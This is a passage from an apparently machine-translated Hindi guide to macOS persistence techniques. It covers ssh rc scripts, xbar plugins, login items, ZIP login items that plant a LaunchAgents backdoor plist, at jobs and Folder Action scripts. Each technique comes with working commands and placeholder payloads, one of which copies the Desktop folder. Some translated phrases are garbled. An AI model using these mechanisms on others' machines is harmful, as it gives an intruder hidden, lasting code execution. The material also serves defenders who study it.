рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)
* рд▓реЗрдХрд┐рди ssh рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`~/.ssh/rc`**
* **рдЯреНрд░рд┐рдЧрд░**: ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЙрдЧрд┐рди
* **`/etc/ssh/sshrc`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* **рдЯреНрд░рд┐рдЧрд░**: ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЙрдЧрд┐рди

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рддрд╛ рд╣реИ**, рд╕реНрдХреНрд░рд┐рдкреНрдЯ **`/etc/ssh/sshrc`** рдФрд░ **`~/.ssh/rc`** рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ, рдЬрдм рддрдХ `/etc/ssh/sshd_config` рдореЗрдВ `PermitUserRC no` рди рд╣реЛред

#### рд╡рд┐рд╡рд░рдг

рдпрджрд┐ рд▓реЛрдХрдкреНрд░рд┐рдп рдХрд╛рд░реНрдпрдХреНрд░рдо [**xbar**](https://github.com/matryer/xbar) рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рддреЛ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рд╢реИрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рд┐рдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **`~/Library/Application\ Support/xbar/plugins/`** рдореЗрдВ рдЬреЛ xbar рдХреА рд╢реБрд░реБрдЖрдд рд╣реЛрддреЗ рд╣реА рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдЧрд╛:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### **рд▓реЙрдЧрд┐рди рдЖрдЗрдЯрдореНрд╕**

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рддрд╛рд░реНрдХрд┐рдХ рд╡рд┐рдзрд┐ рд╕реЗ `osascript` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ

#### рд╕реНрдерд╛рди

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **рдЯреНрд░рд┐рдЧрд░:** рд▓реЙрдЧрд┐рди
* рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдкреЗрд▓реЛрдб рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`osascript`** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **рдЯреНрд░рд┐рдЧрд░:** рд▓реЙрдЧрд┐рди
* рд░реВрдЯ рдЕрдирд┐рд╡рд╛рд░реНрдп

#### рд╡рд┐рд╡рд░рдг

рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдПрдВ -> рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рд╕рдореВрд╣ -> **рд▓реЙрдЧрд┐рди рдЖрдЗрдЯрдореНрд╕** рдореЗрдВ рдЖрдк **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рдХрд░рддреЗ рд╕рдордп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдЖрдЗрдЯрдо** рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрдиреНрд╣реЗрдВ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдирд╛, рдЬреЛрдбрд╝рдирд╛ рдФрд░ рд╣рдЯрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд╕реЗ:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
рдпреЗ рдЖрдЗрдЯрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**рд▓реЙрдЧрд┐рди рдЖрдЗрдЯрдо** рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ рджрд┐рдЦрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) рдЬреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░реЗрдЧрд╛ **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** рдореЗрдВ

### рд▓реЙрдЧрд┐рди рдЖрдЗрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ ZIP

(рд▓реЙрдЧрд┐рди рдЖрдЗрдЯрдо рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдпрд╣ рдПрдХ рд╡рд┐рд╕реНрддрд╛рд░ рд╣реИ)

рдпрджрд┐ рдЖрдк рдПрдХ **ZIP** рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ **рд▓реЙрдЧрд┐рди рдЖрдЗрдЯрдо** рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ **`Archive Utility`** рдЗрд╕реЗ рдЦреЛрд▓реЗрдЧрд╛ рдФрд░ рдпрджрд┐ рдЬрд╝рд┐рдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`~/Library`** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдлрд╝реЛрд▓реНрдбрд░ **`LaunchAgents/file.plist`** рдмреИрдХрдбреЛрд░ рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ) рдФрд░ рдкреНрд▓рд┐рд╕реНрдЯ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рддрд╛рдХрд┐ рдЕрдЧрд▓реА рдмрд╛рд░ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд┐рд░ рд╕реЗ рд▓реЙрдЧ рдЗрди рдХрд░реЗрдЧрд╛, **рдкреНрд▓рд┐рд╕реНрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рдмреИрдХрдбреЛрд░ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛрдо рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ **`.bash_profile`** рдФрд░ **`.zshenv`** рдмрдирд╛рдирд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдлрд╝реЛрд▓реНрдбрд░ LaunchAgents рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИ рддреЛ рдпрд╣ рддрдХрдиреАрдХ рдлрд┐рд░ рднреА рдХрд╛рдо рдХрд░реЗрдЧреАред

### At

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### рд╕реНрдерд╛рди

* **`at`** рдХреЛ **рдЪрд▓рд╛рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рдпрд╣ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП

#### **рд╡рд┐рд╡рд░рдг**

"At tasks" рдХрд╛ рдЙрдкрдпреЛрдЧ **рдирд┐рд╢реНрдЪрд┐рдд рд╕рдордп рдкрд░ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдпреЗ рдХрд╛рд░реНрдп cron рд╕реЗ рдЕрд▓рдЧ рд╣реЛрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ **рдпреЗ рдПрдХ рдмрд╛рд░ рдХреЗ рдХрд╛рд░реНрдп рд╣реЛрддреЗ рд╣реИрдВ** рдЬреЛ рдХрд┐ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡реЗ **рд╕рд┐рд╕реНрдЯрдо рдкреБрдирд░рд╛рд░рдВрдн рдХреЗ рдмрд╛рдж рднреА рдмрдЪ рдЬрд╛рдПрдВрдЧреЗ** рдЗрд╕рд▓рд┐рдП рдЗрдиреНрд╣реЗрдВ рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рдЦрддрд░рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░рд╛рдХрд░рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ рд╡реЗ **рдЕрдХреНрд╖рдо** рд╣реЛрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди **рд░реВрдЯ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдиреНрд╣реЗрдВ **рд╕рдХреНрд╖рдо** рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
рдпрд╣ 1 рдШрдВрдЯреЗ рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдЧрд╛:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
рдЖрдИрдПрдЪрдЯреАрдПрдордПрд▓ рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `atq` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдиреМрдХрд░реА рдХрддрд╛рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
рдКрдкрд░ рд╣рдо рджреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо `at -c JOBNUMBER` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд╛рд░реНрдп рдХрд╛ рд╡рд┐рд╡рд░рдг рдкреНрд░рд┐рдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
рдпрджрд┐ AT tasks рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВ рддреЛ рдмрдирд╛рдП рдЧрдП tasks рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
{% endhint %}

**рдЬреЙрдм рдлрд╝рд╛рдЗрд▓реЗрдВ** `/private/var/at/jobs/` рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреА рд╣реИрдВред
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
рдлрд╝рд╛рдЗрд▓рдирд╛рдо рдореЗрдВ рдХрддрд╛рд░, рдиреМрдХрд░реА рдирдВрдмрд░ рдФрд░ рдпрд╣ рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╣рдо `a0001a019bdcd2` рдкрд░ рдПрдХ рдирдЬрд╝рд░ рдбрд╛рд▓рддреЗ рд╣реИрдВред

* `a` - рдпрд╣ рдХрддрд╛рд░ рд╣реИ
* `0001a` - рд╣реЗрдХреНрд╕ рдореЗрдВ рдиреМрдХрд░реА рдирдВрдмрд░, `0x1a = 26`
* `019bdcd2` - рд╣реЗрдХреНрд╕ рдореЗрдВ рд╕рдордпред рдпрд╣ рдЗрдкреЙрдХ рдХреЗ рдмрд╛рдж рдмрд┐рддрд╛рдП рдЧрдП рдорд┐рдирдЯреЛрдВ рдХреЛ рдкреНрд░рддрд┐рд╖реНрдард╛рди рдХрд░рддрд╛ рд╣реИред `0x019bdcd2` рджрд╢рдорд▓рд╡ рдореЗрдВ `26991826` рд╣реИред рдпрджрд┐ рд╣рдо рдЗрд╕реЗ 60 рд╕реЗ рдЧреБрдгрд╛ рдХрд░реЗрдВ рддреЛ рд╣рдореЗрдВ `1619509560` рдорд┐рд▓рддрд╛ рд╣реИ, рдЬреЛ `GMT: 2021 рдЕрдкреНрд░реИрд▓ 27, рдордВрдЧрд▓рд╡рд╛рд░ 7:46:00` рд╣реИред

рдпрджрд┐ рд╣рдо рдиреМрдХрд░реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдВ, рддреЛ рд╣рдореЗрдВ `at -c` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИред

### рдлрд╝реЛрд▓реНрдбрд░ рдХреНрд░рд┐рдпрд╛рдПрдБ

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
рд▓реЗрдЦ: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рддрд░реНрдХ рдХреЗ рд╕рд╛рде osascript рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП

#### рд╕реНрдерд╛рди

* **`/Library/Scripts/Folder Action Scripts`**
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛
* **рдЯреНрд░рд┐рдЧрд░**: рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪ
* **`~/Library/Scripts/Folder Action Scripts`**
* **рдЯреНрд░рд┐рдЧрд░**: рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХреНрд░рд┐рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд╕рд╛рде рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╣реЛрдиреЗ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЙрд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рд╣рдЯрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╛ рдЬрдм рдЗрд╕рдХреА рд╡рд┐рдВрдбреЛ рдЦреБрд▓реА, рдмрдВрдж, рд╣рдЯрд╛рдИ рдЬрд╛рддреА рд╣реИ, рдпрд╛ рдЗрд╕реЗ рдЖрдХрд╛рд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

* рдлрд╝рд╛рдЗрдВрдбрд░ UI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝реЛрд▓реНрдбрд░ рдЦреЛрд▓реЗрдВ
* рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЬреЛрдбрд╝реЗрдВ (рдбреНрд░реИрдЧ/рдбреНрд░реЙрдк рдпрд╛ рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ рд╢реЗрд▓ рдкреНрд░реЙрдореНрдкреНрдЯ рдореЗрдВ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)
* рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣рдЯрд╛рдПрдБ (рдбреНрд░реИрдЧ/рдбреНрд░реЙрдк рдпрд╛ рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ рд╢реЗрд▓ рдкреНрд░реЙрдореНрдкреНрдЯ рдореЗрдВ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)
* рдпреВрдЖрдИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдмрд╛рд╣рд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВ

рдЗрд╕реЗ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХреНрд░рд┐рдпрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдлрд╝рд╛рдЗрд▓ (.workflow) рдмрдирд╛рдПрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ рд╕реЗрд╡рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред
2. рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, `Folder Actions Setup...`, `Run Service` рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ, рдФрд░ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВред
3. OSAScript рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `System Events.app` рдХреЛ Apple Event рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЧреНрд░рд╛рдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ рдПрдХ рдирдпрд╛ `Folder Action` рдкреНрд░рд╢реНрди рдХрд░реЗрдВ рдФрд░ рдкрдВрдЬреАрдХреГрдд рдХрд░реЗрдВред



* рдпрд╣ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ рдкреНрд░рджреНрдпреБрддреНрдкрдиреНрдирддрд╛ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХрд╛, рдЬрд╣рд╛рдВ OSAScript рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Apple Event рд╕рдВрджреЗрд╢ `System Events.app` рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

рдЗрд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ: `osacompile -l JavaScript -o folder.scpt source.js`

рдлрд┐рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдлрд╝реЛрд▓реНрдбрд░ рдПрдХреНрд╢рди рдХреЛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдкрд╣рд▓реЗ рд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдлрд╝реЛрд▓реНрдбрд░ **`/users/username/Desktop`** рдХреЗ рд╕рд╛рде рд╕рдВрд▓рдЧреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ: `osascript -l JavaScript /Users/username/attach.scpt`



* рдпрд╣ рдПрдХ GUI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдерд┐рд░рддрд╛ рдХреЛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:

рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

рдЗрд╕реЗ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ: `osacompile -l JavaScript -o folder.scpt source.js`

рдЗрд╕реЗ рдЗрд╕ рддрд╛рд░реАрдЦ рдореЗрдВ рд▓реЗ рдЬрд╛рдПрдВ:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
рддреЛ, `Folder Actions Setup` рдРрдк рдХреЛ рдЦреЛрд▓реЗрдВ, **рд╡рд╣ рдлрд╝реЛрд▓реНрдбрд░ рдЪреБрдиреЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдФрд░ рдЕрдкрдиреЗ рдорд╛рдорд▓реЗ рдореЗрдВ **`folder.scpt`** рдХреЛ рдЪреБрдиреЗрдВ (рдореЗрд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдореИрдВрдиреЗ рдЗрд╕реЗ output2.scp рдирд╛рдо рджрд┐рдпрд╛ рдерд╛):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

рдЕрдм, рдпрджрд┐ рдЖрдк рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ **Finder** рдХреЗ рд╕рд╛рде рдЦреЛрд▓реЗрдВ, рддреЛ рдЖрдкрдХрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди **plist** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬреЛ рдмреЗрд╕64 рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╣реИ рдФрд░ рд╕реНрдерд┐рдд рд╣реИ **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**ред

